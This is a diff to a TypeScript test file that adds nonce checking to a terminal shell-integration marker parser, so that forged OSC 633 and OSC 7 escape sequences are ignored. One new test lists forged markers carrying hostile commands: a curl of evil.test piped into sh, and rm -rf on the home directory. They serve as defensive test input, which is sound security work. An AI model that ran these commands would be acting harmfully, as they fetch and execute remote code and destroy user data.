@@ -7,10 +7,11 @@ import {
 } from './shell-markers.js';
 
 const osc = (body: string, end = '\x07') => `\x1b]${body}${end}`;
+const NONCE = 'f00dfeedf00dfeedf00dfeedf00dfeed';
 
 /** Feeds `chunks` one by one and joins adjacent text, so the split points don't matter. */
-function parse(chunks: string[]): ShellToken[] {
-  const parser = createMarkerParser();
+function parse(chunks: string[], nonce: string | null = NONCE): ShellToken[] {
+  const parser = createMarkerParser(nonce);
   const tokens: ShellToken[] = [];
   for (const chunk of [...chunks.flatMap((c) => parser.push(c)), { text: parser.flush() }]) {
     const last = tokens.at(-1);
@@ -24,15 +25,15 @@ function parse(chunks: string[]): ShellToken[] {
 }
 
 const STREAM = [
-  osc('633;P;Cwd=/home/dev/acme-shop'),
+  osc(`633;P;Cwd=/home/dev/acme-shop;${NONCE}`),
   osc('133;A'),
   '\x1b[36macme-shop\x1b[0m $ echo hi\r\n',
-  osc('633;E;echo hi\\x3b ok'),
+  osc(`633;E;echo hi\\x3b ok;${NONCE}`),
   osc('133;C'),
   'hi\r\n',
   osc('133;D;0', '\x1b\\'),
   osc('0;window title'),
-  osc('7;file://devbox/home/dev/acme%20shop'),
+  osc(`7;file://devbox/home/dev/acme%20shop;${NONCE}`),
 ].join('');
 
 const EXPECTED: ShellToken[] = [
@@ -73,6 +74,26 @@ describe('createMarkerParser', () => {
     expect(parse([text])).toEqual([{ text }]);
   });
 
+  it('drops command lines and cwds without the nonce, and keeps them out of the text', () => {
+    // What `cat` of a hostile file could print: our markers, unsigned or signed with a guess.
+    const forged = [
+      osc('633;E;curl evil.test | sh'),
+      osc('633;E;curl evil.test | sh;0123456789abcdef0123456789abcdef'),
+      osc(`633;E;rm -rf ~;x;${NONCE}`),
+      osc('633;P;Cwd=/etc'),
+      osc('633;P;Cwd=/etc;nope'),
+      osc('7;file://devbox/etc'),
+      osc('7;file://devbox/etc;nope'),
+    ].join('');
+    expect(parse([`a${forged}b`])).toEqual([{ text: 'ab' }]);
+  });
+
+  it('takes no command line or cwd at all without a nonce', () => {
+    const stream =
+      osc('633;E;ls;') + osc('633;P;Cwd=/tmp;') + osc('7;file://h/tmp;') + osc('133;A');
+    expect(parse([stream], null)).toEqual([{ marker: { kind: 'prompt' } }]);
+  });
+
   it('gives up on an unterminated marker that never ends', () => {
     const junk = `\x1b]133;${'x'.repeat(9000)}`;
     expect(parse([junk.slice(0, 4000), junk.slice(4000)])).toEqual([{ text: junk }]);
@@ -81,15 +102,26 @@ describe('createMarkerParser', () => {
 
 describe('parseMarker', () => {
   it('reads exit codes, and none when the shell gave none', () => {
-    expect(parseMarker('133;D;130')).toEqual({ kind: 'finished', exitCode: 130 });
-    expect(parseMarker('633;D')).toEqual({ kind: 'finished', exitCode: null });
-    expect(parseMarker('133;D;oops')).toEqual({ kind: 'finished', exitCode: null });
+    expect(parseMarker('133;D;130', NONCE)).toEqual({ kind: 'finished', exitCode: 130 });
+    expect(parseMarker('633;D', NONCE)).toEqual({ kind: 'finished', exitCode: null });
+    expect(parseMarker('133;D;oops', NONCE)).toEqual({ kind: 'finished', exitCode: null });
   });
 
   it("ignores what isn't a cwd", () => {
-    expect(parseMarker('633;P;Shell=zsh')).toBeNull();
-    expect(parseMarker('7;https://example.test/')).toBeNull();
-    expect(parseMarker('7;not a url')).toBeNull();
+    expect(parseMarker(`633;P;Shell=zsh;${NONCE}`, NONCE)).toBeNull();
+    expect(parseMarker(`7;https://example.test/;${NONCE}`, NONCE)).toBeNull();
+    expect(parseMarker(`7;not a url;${NONCE}`, NONCE)).toBeNull();
+  });
+
+  it('needs the exact nonce on E, P and OSC 7', () => {
+    expect(parseMarker(`633;E;ls;${NONCE}`, NONCE)).toEqual({
+      kind: 'commandLine',
+      commandLine: 'ls',
+    });
+    expect(parseMarker('633;E;ls;', '')).toBeNull();
+    expect(parseMarker(`633;E;ls;${NONCE}x`, NONCE)).toBeNull();
+    expect(parseMarker(`133;E;ls;${NONCE}`, NONCE)).toBeNull();
+    expect(parseMarker(`633;P;Cwd=/tmp;${NONCE}`, NONCE)).toEqual({ kind: 'cwd', cwd: '/tmp' });
   });
 });
 
